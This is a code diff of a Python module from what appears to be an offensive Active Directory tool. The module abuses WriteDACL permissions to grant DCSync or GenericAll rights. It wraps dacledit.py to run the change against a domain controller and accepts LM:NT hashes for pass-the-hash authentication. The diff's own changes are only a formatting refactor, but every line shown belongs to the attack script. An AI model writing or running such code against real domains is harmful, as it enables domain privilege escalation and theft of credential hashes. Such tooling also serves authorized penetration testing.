@@ -1,5 +1,4 @@
 """WriteDACL abuse — grant DCSync/GenericAll rights when holding WriteDACL."""
-from __future__ import annotations
 import subprocess
 import sys
 import shutil
@@ -27,7 +26,7 @@ def run(args: Any) -> int:
         print("[!] --target-dn required (e.g., domain DN for DCSync)", file=sys.stderr)
         return 1
 
-    print("[*] WriteDACL abuse: grant {} to {} on {}".format(escalation, principal, target_dn))
+    print(f"[*] WriteDACL abuse: grant {escalation} to {principal} on {target_dn}")
 
     if shutil.which("dacledit.py"):
         cmd = [
@@ -37,10 +36,10 @@ def run(args: Any) -> int:
             "-principal", principal,
             "-target-dn", target_dn,
             "-dc-ip", dc_ip,
-            "{}\\{}".format(args.domain, cred.username),
+            f"{args.domain}\\{cred.username}",
         ]
         if cred.has_hash:
-            cmd.extend(["-hashes", "{}:{}".format(cred.lm_hash, cred.nt_hash)])
+            cmd.extend(["-hashes", f"{cred.lm_hash}:{cred.nt_hash}"])
 
         print("[*] {}".format(" ".join(cmd)))
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
